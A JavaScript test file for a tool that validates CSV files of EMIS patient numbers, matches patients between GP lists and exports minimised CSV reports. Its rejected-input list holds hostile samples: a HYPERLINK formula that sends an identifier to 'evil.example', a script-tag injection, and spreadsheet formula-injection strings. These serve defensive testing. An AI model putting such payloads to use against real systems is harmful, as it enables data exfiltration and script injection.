import assert from 'node:assert/strict';
import test from 'node:test';
import {validateEmisCsv, parseCsv, analyse, safeCsvField, proposalCsv} from './logic.mjs';

const valid = 'EMIS Number\r\n0000001\r\n0000002\r\n0000001\r\n';
test('import preserves identifiers and deduplicates', () => {
  assert.deepEqual(validateEmisCsv(valid), {ids:['0000001','0000002'], duplicates:1, rows:3});
  assert.deepEqual(validateEmisCsv('"EMIS Number"\n"0000001"').ids, ['0000001']);
  assert.deepEqual(validateEmisCsv('\uFEFFEMIS Number\n0000001').ids, ['0000001']);
});
const rejected = [
  '', 'EMIS Number', 'patient number\n123', 'NHS Number\n1234567890',
  'EMIS Number,NHS Number\n1,2', 'Name,EMIS Number\nA,123',
  'EMIS Number\nJane', 'EMIS Number\n0123-45',
  'EMIS Number\n=HYPERLINK("https://evil.example/?q=0123")',
  'EMIS Number\n+12345', 'EMIS Number\n<script>alert(1)</script>',
  'EMIS Number\n123\nJane Doe', 'EMIS Number\n123,456',
  '"EMIS Number\n123', 'EMIS Number\n123"tail',
  'EMIS Number\n001\t2', 'EMIS Number\n123\u0000',
  'EMIS Number\n123\n\n456,789', 'EMIS Number\n1\r2,3'
];
for (const [i, input] of rejected.entries()) test('reject malformed or identifiable CSV ' + i, () => {
  assert.throws(() => validateEmisCsv(input), error => !error.message.includes('evil.example') && !error.message.includes('Jane'));
});
test('reject huge CSV and huge row count', () => {
  assert.throws(() => validateEmisCsv('EMIS Number\n' + '1'.repeat(8_000_001)));
  assert.throws(() => validateEmisCsv('EMIS Number\n' + '1\n'.repeat(30_001)));
});
function dataset(){
  return [
    {kind:'owner',gp:'Dr A',ids:['0001','0002']},
    {kind:'owner',gp:'Dr B',ids:['0003','0004']},
    {kind:'notseen',gp:'Dr A',ids:['0001','0002']},
    {kind:'notseen',gp:'Dr B',ids:['0003','0004']},
    {kind:'seen',gp:'Dr B',ids:['0001','0002']},
    {kind:'seen',gp:'Dr A',ids:['0003']}
  ];
}
test('reciprocal matches preserve list sizes and outputs only minimised data', () => {
  const result=analyse(dataset());
  assert.equal(result.pairs.length,1);
  assert.equal(result.unmatched.length,1);
  assert.deepEqual([result.pairs[0].first.id,result.pairs[0].second.id], ['0001','0003']);
  const report=proposalCsv(result);
  assert.match(report,/0001/); assert.match(report,/0003/);
  assert.doesNotMatch(report,/0002/);
  assert.equal(report.trim().split(/\r?\n/).length,3);
  assert.doesNotMatch(report,/https?:\/\//);
});
test('fail closed with missing cohort', () => {
  const result=analyse(dataset().filter(c=>!(c.kind==='notseen'&&c.gp==='Dr B')));
  assert.equal(result.pairs.length,0);
  assert.deepEqual(result.incomplete,['Dr B']);
});
test('fail closed with contradictory evidence', () => {
  const result=analyse([...dataset().filter(c=>c.kind!=='seen'||c.gp!=='Dr A'),{kind:'seen',gp:'Dr A',ids:['0003','0001']}]);
  assert.equal(result.contradictoryCount,1);
  assert.equal(result.pairs.length,1); // the unaffected 0002 <-> 0003 pair remains
  assert.equal(result.pairs[0].first.id,'0002');
});
test('exclude duplicate ownership and ambiguous alternatives', () => {
  const conflicting=analyse([...dataset(),{kind:'owner',gp:'Dr B',ids:['0001']}]);
  assert.ok(conflicting.conflicts.includes('0001'));
  assert.equal(conflicting.pairs.length,1); // 0002 with 0003
  const ambiguous=analyse([...dataset(),{kind:'owner',gp:'Dr C',ids:['0005']},{kind:'seen',gp:'Dr C',ids:['0001']},{kind:'notseen',gp:'Dr C',ids:['0005']}]);
  assert.equal(ambiguous.pairs.length,1); // 0002 with 0003
});
test('CSV export defends against spreadsheet formula injection', () => {
  assert.equal(safeCsvField('=cmd'), '"\'=cmd"');
  assert.equal(safeCsvField(' +SUM(1,2)'), '"\' +SUM(1,2)"');
  assert.equal(safeCsvField('normal"data'), '"normal""data"');
});
test('parseCsv rejects malformed quoted structure', () => {
  assert.throws(()=>parseCsv('EMIS Number\n"123"xxx'));
});
